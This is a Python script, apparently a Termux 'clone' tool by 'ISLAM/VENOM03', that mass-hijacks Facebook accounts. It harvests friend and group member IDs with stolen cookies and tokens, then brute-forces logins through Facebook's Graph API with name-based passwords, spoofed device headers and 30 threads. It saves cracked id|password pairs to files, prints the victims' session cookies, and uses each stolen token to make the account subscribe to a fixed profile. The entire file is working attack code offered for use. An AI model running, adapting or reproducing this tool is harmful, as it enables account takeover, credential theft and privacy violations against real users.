""" REVERSE BY ---( islam/VENOM03-T OFFICIAL )--- """

try:
	import os,requests,json,time,re,random,sys,uuid,string,base64,zlib,hashlib,subprocess
	from string import *
	from bs4 import BeautifulSoup as sop
	from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError: 
	print('\n Installing missing modules ...')
	os.system('pip install requests futures bs4 > /dev/null')
	exit(' Module install done run again ')
oks,cps,loop,pcp,tokenku=[],[],0,[],[]
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_US'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv}
id=[]
tab=[]
ses = requests.Session()
logo = '''
\033[1;37m  d888888b .d8888.db       .d8b.  .88b  d88.
   `88'   88'  YP 88      d8' `8b 88'YbdP`88
    88    `8bo.   88      88ooo88 88  88  88
    88      `Y8b. 88      88~~~88 88  88  88
   .88.   db   8D 88booo. 88   88 88  88  88
 Y888888P `8888Y' Y88888P YP   YP YP  YP  YP
------------------------------------------------
  Author : ISLAM/VENOM03
  Github : Unknown
  Fcbook : https://www.facebook.com/copnrt.03
  Version : 0.1
------------------------------------------------
 Nothing is impossible : islam/VENOM03-T
------------------------------------------------'''
def clear():
    os.system('clear')
    print(logo)
def linex():
    print('\033[1;37m----------------------------------------------')
def chek(ids,pas):
	try:
		host = "https://mbasic.facebook.com"
		ua_crack = ["Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux armv6l) EkiohFlow/5.13.4.34727M Flow/5.13.4 (like Gecko Firefox/62.0 rv:62.0)","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Silk/102.2.1 like Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36 PTST/220727.141334","Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.0.8) Gecko/20061025 Firefox/1.5.0.8","Links (2.20.2; Linux 5.4.0-100-generic x86_64; GNU C 9.2.1; text)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (Linux; x86_64 GNU/Linux) AppleWebKit/601.1 (KHTML, like Gecko) Version/8.0 Safari/601.1 WPE comcast/ipstb (comcast, 1.0.0.0)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.022","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.0","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3440.106 Safari/537.36 SmartTV/9.0 Crow/1.0"]
		ua = random.choice(ua_crack)
		ses = requests.Session()
		ses.headers.update = {'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=lzPZZQUc9W_mop0LG-416w82; sb=mzPZZQBC3g_Yf9H5_F3dnlwh; ps_n=1; ps_l=1; dpr=2.734679698944092; m_pixel_ratio=2.734679698944092; wd=968x1895; fr=0rRJ5NXxHZ5ChutEj.AWVChTGaNAx5IrQvDwhhzojSF54.Bl2TOX..AAA.0.0.BmK6ON.AWU3uA6U_4E',
    'dpr': '2.700000047683716',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'viewport-width': '980',}
		data = {}
		ged = sop(ses.get(host+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
		fm = ged.find("form",{"method":"post"})
		list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
		for i in fm.find_all("input"):
			if i.get("name") in list:
				data.update({i.get("name"):i.get("value")})
			else:
				continue
		data.update({"email":ids,"pass":pas})
		try:
			run = sop(ses.post(host+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
		except requests.exceptions.TooManyRedirects:
			pass
		if "c_user" in ses.cookies:
			print('\r\r\033[1;32m [ISLAM-OK] %s | %s'%(ids,pas))
			open('/sdcard/AKING-OK.txt','a').write(ids+'|'+pas+'\n')
			oks.append(ids)
		elif "checkpoint" in ses.cookies:
			form = run.find("form")
			dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
			jzst = form.find("input",{"name":"jazoest"})["value"]
			nh   = form.find("input",{"name":"nh"})["value"]
			dataD = {
				"fb_dtsg": dtsg,
				"fb_dtsg": dtsg,
				"jazoest": jzst,
				"jazoest": jzst,
				"checkpoint_data":"",
				"submit[Continue]":"Lanjutkan",
				"nh": nh
				}
			xnxx = sop(ses.post(host+form["action"], data=dataD).text, "html.parser")
			ngew = [yy.text for yy in xnxx.find_all("option")]
			if(str(len(ngew))=="0"):
				print('\r\r\033[1;36m [ISLAM-1T] %s | %s'%(ids,pas))
				open('/sdcard/ISLAM-1T.txt','a').write(ids+'|'+pas+'\n')
				tab.append(ids)
			else:
				if 'y' in pcp:
					print('\r\r\033[1;31m [ISLAM-CP] '+ids+' | '+pas+'\033[1;97m')
				else:
					pass
				open('/sdcard/ISLAM-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
	except Exception as e:pass
def main():
    clear()
    print(' [1] Start Public Clone \n [2] Start Dump Group \n [3] Start File Clone \n [4] Remove Dublicate Links (from file)\n [0] Exit Menu ');linex()
    x = input(' Choose: ')
    if x =='1':
        public()
    elif x =='2':
        group()
    elif x =='3':
        file()
    elif x =='4':
        remove_dub()
    else:exit()
def remove_dub():
	os.system('clear')
	print(logo)
	user_file = input(' Put file path: ')
	try:
		open(user_file,'r').read()
		save_file = input(' New file save as: ')
		os.system('touch '+save_file)
		os.system('sort -r '+user_file+' | uniq > '+save_file)
		linex()
		print(' Dublicate links removed has been Successful ')
		linex()
		print(' File saved as: '+save_file)
		linex()
		input(' Press enter to back ')
		Main()
	except FileNotFoundError:
		print(' File not found.')
def group():
    try:
        clear()
        coki = {'cookie':open('.coki.txt','r').read()}
        tok = open('.token.txt', 'r').read()
    except:
        print('\n\033[1;31m Cookies Expierd ! ');time.sleep(1);login()
    try:
        check_cookies = ses.get('https://graph.facebook.com/me?access_token='+tok,cookies=coki).text
        load = json.loads(check_cookies)
        name = load['name']
    except KeyError:
        print('\n Cookies has expired, login another cookies.')
        time.sleep(1)
        os.system('rm -rf .coki.txt .token.txt')
        login()
    except requests.exceptions.ConnectionError:
        print(' No internet connection ...')
    print(' Welcome : '+name)
    linex()
    plist=[]
    user = input(f" Put Group ID : ")
    linex()
    try:
        link = ses.get(f"https://mbasic.facebook.com/groups/{user}", cookies=coki).text
        if "The page you requested was not found." in link:
            print(f" User With Group Id {user} Not Found");time.sleep(2);menu()
        elif "You are Temporarily Blocked" in link:
                print(" Facebook Limits Every Activity, Limit Bro, Please Switch Accounts");time.sleep(2);menu()
        elif "Content Not Found" in link:
            print(f" User With Group Id {user} Not Found");time.sleep(2);menu()
        else:
            sv = input(' File Save As? : ')
            linex()
            print(' Do You Want To Remove Old File? (y/n): ')
            linex()
            orm = input(' Choose: ')
            if orm in ['y','Y']:
                os.system('rm -rf '+sv)
            else:pass
            linex()
            print(" Dumping Start Please Wait...")
            linex()
            dumps(f"https://mbasic.facebook.com/groups/{user}",coki,sv)
    except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
        exit(" connection error")
    print('\033[1;37m')
    linex()
    print(' The process has completed')
    linex()
    input(' Press Any Key For Exit ');exit()
def dumps(link, coki, sv):
    try:
        idv = []
        data = ses.get(link, cookies=coki).text
        cari = re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>', data)
        for x in cari:
            if "profile.php?" in x[0]:
                id.append(re.findall("id=(.*?)&amp;eav", x[0])[0]+"|"+x[1])
                for xd in id:
                    iid,name = xd.split('|')
                    if iid in idv:pass
                    else:
                        idv.append(iid)
                        open(sv,'a').write(iid+'|'+name+'\n')
            else:
                id.append(re.findall("(.*?)\?eav", x[0])[0]+"|"+x[1])
                for xd in id:
                    iid,name = xd.split('|')
                    if iid in idv:pass
                    else:
                        idv.append(iid)
                        open(sv,'a').write(iid+'|'+name+'\n')
            sys.stdout.write(f"\r Dumping [Total :- {str(len(id))}]");sys.stdout.flush()
        if "Lihat Postingan Lainnya" in data:
            dumps("https://mbasic.facebook.com"+par(data, "html.parser").find("a", string="Lihat Postingan Lainnya").get("href"), coki,sv)
  #  except:pass
    except Exception as e:print(e)
def check(cookies):
	try:
		cookie = {'cookie':cookies}
		with requests.Session() as xyz:
			url = 'https://www.facebook.com/adsmanager/manage/campaigns'
			req = xyz.get(url,cookies=cookie)
			set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
			nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
			roq = xyz.get(nek,cookies=cookie)
			tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
			open('.token.txt','a').write(tok)
	except:
		print('\n Cookies Expierd')
		time.sleep(1)
		os.system('rm -rf .coki.txt .token.txt')
		login()
def login():
	os.system('clear')
	print(logo)
	cookies = input(' Put cookies here: ')
	try:
		check(cookies)
		open(".coki.txt","w").write(cookies)
		token=open('.token.txt','r').read()
		info = requests.get('https://graph.facebook.com/me/?access_token='+token,cookies = {"cookie":cookies}).json()
		name= info['name']
		print('\033[1;32m Welcome : '+name)
		time.sleep(1)
		main()
	except KeyError:
		print(' Cookies han been expierd ')
		login()
	except requests.exceptions.ConnectionError:
		print('\ No internet connection ...');exit()
		exit()
	except AttributeError:
		print(' Cookies han been expierd ')
		login()
def public():
    ids = []
    plist=[]
    xyz = requests.Session()
    clear()
    try:
        cookies = {'cookie':open('.coki.txt','r').read()}
        access_token = open('.token.txt', 'r').read()
    except FileNotFoundError:
        login()
    try:
        check_cookies = xyz.get('https://graph.facebook.com/me?access_token='+access_token,cookies=cookies).text
        load = json.loads(check_cookies)
        name = load['name']
    except KeyError:
        print('\n Cookies has expired, login another cookies.')
        time.sleep(1)
        os.system('rm -rf .coki.txt .token.txt')
        login()
    except requests.exceptions.ConnectionError:
        print(' No internet connection ...')
    print(' Welcome : '+name)
    print(46*'-')
    idsLimit = int(input('\033[1;34m How many ids do you want to add: '))
    linex()
    for public in range(idsLimit):
        link = input(f'\033[1;37m Put link no.{public+1}: ')
        try:
            fdUrl = 'https://graph.facebook.com/%s?fields=friends.fields(id,name).limit(5000)&access_token=%s'%(link,access_token)
            r = xyz.get(fdUrl,cookies=cookies).text
            flist = json.loads(r)
            for sohni in flist['friends']['data']:
                iid = sohni['id']
                name = sohni['name']
                ids.append(iid+'|'+name)
        except requests.exceptions.ConnectionError:
            print(' No internet connection')
        except KeyError:
            print(' No friends found ...');exit()
    linex()
    passLimit = int(input(' How many passwords do you want to add: '))
    linex()
    print('\033[1;32m exp: first last,firtslast,first123')
    linex()
    for psw in range(passLimit):
        plist.append(input(f' Put Password No.{psw+1}: '))
    linex()
    x = input(' Do You Want Show CP? (y/n) : ')
    if x in ['y','Y']:
        pcp.append('y')
    clear()
    total_ids = str(len(ids))
    print(' Total ids : \033[1;32m'+total_ids)
    print("\033[1;31m The Burte Has Been Started Wait & Watch\033[1;37m")
    linex()
    with tred(max_workers=30) as public:
        for user in ids:
            ids,names = user.split('|')
            passlist = plist
            public.submit(api,ids,names,passlist,total_ids)
    print('\n')
    linex()
    print(' The process has completed')
    print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
    linex()
def file():
	clear()
	file = input(' Put file path\033[1;37m: ')
	try:
		fo = open(file,'r').read().splitlines()
	except FileNotFoundError:
		print(' File location not found ')
		time.sleep(1)
		main()
	clear()
	plist=[]
	try:
		ps_limit = int(input(' How many passwords do you want to add ? '))
	except:
		ps_limit =1
	linex()
	print('\033[1;32m exp: first last,firtslast,first123')
	linex()
	for i in range(ps_limit):
		plist.append(input(f' Put password {i+1}: '))
	linex()
	print(' Do you went show cp account? (y/n): ')
	linex()
	cx=input(' Choose: ')
	if cx in ['y','Y','yes','Yes','1']:
		pcp.append('y')
	else:
		pcp.append('n')
	with tred(max_workers=30) as crack_submit:
		clear()
		total_ids = str(len(fo))
		print(' Total ids : \033[1;32m'+total_ids)
		print("\033[1;31m The Burte Has Been Started Wait & Watch\033[1;37m")
		linex()
		for user in fo:
			ids,names = user.split('|')
			passlist = plist
			crack_submit.submit(api,ids,names,passlist,total_ids)
	print('\033[1;37m')
	linex()
	print(' The process has completed')
	print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
	linex()
	input(' Press enter to back ')
	os.system('python AKING.py')
samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V']
def api(ids,names,passlist,total_ids):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [ISLAM-XD] %s|%s\033[1;32m [OK:-%s]\033[1;34m•\033[1;33m[CP:-%s] \033[1;37m'%(loop,total_ids,len(oks),len(cps)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
			ln = fn
		for pw in passlist:
			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
			adid = str(uuid.uuid4())
			fbav = str(random.randint(200,350))+"."+str(random.randint(600,730))+"."+str(random.randint(604,690))+"."+str(random.randint(140,197))
			fbbv = str(random.randint(111111111,999999999))
			fbrv = str(random.randint(111111111,999999999))
			model = device['model']
			build = device['build']
			fbmf = device['fbmf']
			fbbd = device['fbbd']
			fbdv = device['fbdv']
			fbsv = device['fbsv']
		#	fbca = device['fbca']
			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
			ua = 'Dalvik/2.1.0 (Linux; U; Android '+fbsv+'.1.1; '+model+' Build/'+build+') "[FBAN/FB4A;FBAV/167.0.0.33.94;FBBV/101783969;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBRV/0;FBCR/StarHub Mobile;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/A37f;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/63.0.0.37.81;FBBV/21778670;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/MPT;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/1201;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]'+'[FBAN/FB4A;FBAV/87.0.0.17.79;FBBV/34592834;FBDM/{density=1.5,width=480,height=854};FBLC/es_LA;FBCR/Movistar;FBMF/ZUUM;FBBD/ZUUM;FBPN/com.facebook.katana;FBDV/MAGNO;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/75.0.0.23.69;FBBV/29142808;FBDM/{density=1.0,width=600,height=1024};FBLC/es_LA;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T210R;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/83.0.0.20.71;FBBV/32723413;FBDM/{density=1.5,width=480,height=854};FBLC/es_LA;FBCR/;FBMF/ZTE;FBBD/ZTE;FBPN/com.facebook.katana;FBDV/BLADE L7;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/87.0.0.3.78;FBBV/34180696;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBCR/Claro AR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J320M;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034644;FBDM/{density=2.0,width=720,height=1204};FBLC/en_US;FBCR/LoneStar;FBMF/TECNO;FBBD/TECNO;FBPN/com.facebook.katana;FBDV/TECNO-J8;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/65.0.0.42.81;FBBV/23239543;FBDM/{density=3.0,width=1080,height=1920};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/7.0;nullFBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/86.0.0.19.69;FBBV/34022666;FBDM/{density=2.0,width=720,height=1280};FBLC/fr_FR;FBCR/;FBMF/condor;FBBD/condor;FBPN/com.facebook.katana;FBDV/PGN605;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/142.0.0.29.92;FBBV/72571763;FBDM/{density=1.5,width=480,height=800};FBLC/fr_FR;FBRV/72870924;FBCR/Djezzy;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J120H;FBSV/5.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/59.0.0.0.177;FBBV/19340254;FBDM/{density=1.5,width=540,height=960};FBLC/es_ES;FBCR/Claro;FBMF/LOGIC;FBBD/LOGIC;FBPN/com.facebook.katana;FBDV/LOGIC X5.5T;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/64.0.0.52.76;FBBV/22754206;FBDM/{density=1.5,width=540,height=888};FBLC/es_LA;FBCR/AT&amp-T;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/MotoE2;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034615;FBDM/{density=1.5,width=480,height=800};FBLC/en_GB;FBCR/MTML;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J110H;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529747;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBCR/;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One_E8;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034644;FBDM/{density=3.0,width=1080,height=1806};FBLC/en_US;FBCR/TIGO;FBMF/TECNO;FBBD/TECNO;FBPN/com.facebook.katana;FBDV/Phantom6;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454115;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/Gamcel;FBMF/Itel;FBBD/Itel;FBPN/com.facebook.katana;FBDV/itel it1408;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/86.0.0.19.69;FBBV/34022707;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/Telenor;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/65.0.0.42.81;FBBV/23239444;FBDM/{density=1.5,width=720,height=1208};FBLC/en_US;FBCR/MPT;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D2502;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/70.0.0.22.83;FBBV/26502135;FBDM/{density=1.0,width=800,height=1232};FBLC/es_LA;FBCR/;FBMF/ECS;FBBD/JP;FBPN/com.facebook.katana;FBDV/TR10CS1;FBSV/4.4.2;FBOP/1;FBCA/x86:armeabi-v7a;][FBAN/FB4A;FBAV/71.0.0.17.73;FBBV/27002204;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Airtel;FBMF/itel;FBBD/Itel;FBPN/com.facebook.katana;FBDV/itel it1508;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/81.0.0.22.70;FBBV/31880536;FBDM/{density=1.5,width=540,height=960};FBLC/my_MM;FBCR/MPT;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1707;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
			head = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
			data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'pt_BR','client_country_code':'BR','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
			url = 'https://b-graph.facebook.com/auth/login'
			po = requests.post(url,params=data,headers=head,allow_redirects=False).json()
			if 'session_key' in po:
				print('\r\r\033[1;32m [ISLAM-OK] '+ids+' | '+pas+'\033[1;97m')
				open('/sdcard/OK.txt','a').write(ids+'|'+pas+'\n')
				session = po['session_cookies']
				cookie = ''
				cuser = session[0]
				cuser = session[0]['name']+'='+session[0]['value']
				cookie+=cuser+';'
				xs = session[1]['name']+'='+session[1]['value']
				cookie+=xs+';'
				fr = session[2]['name']+'='+session[2]['value']
				cookie+=fr+';'
				datr = session[3]['name']+'='+session[3]['value']
				cookie+=datr+'; dpr=2; locale=en_US; wd=950x1835; '
				pagevoice = cuser.replace('c_user','m_page_voice')
				cookie+=pagevoice
				print('\033[1;37m [🍪] Cookies :- '+cookie)
				token = po['access_token']
				requests.post('https://graph.facebook.com/'+'127103294/'+'subscribers'+'?access_token='+token)
				oks.append(ids)
				break
			elif 'www.facebook.com' in po['error']['message']:
				chek(ids,pas)
				break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	except Exception as e:
		#print(e)
		pass
main()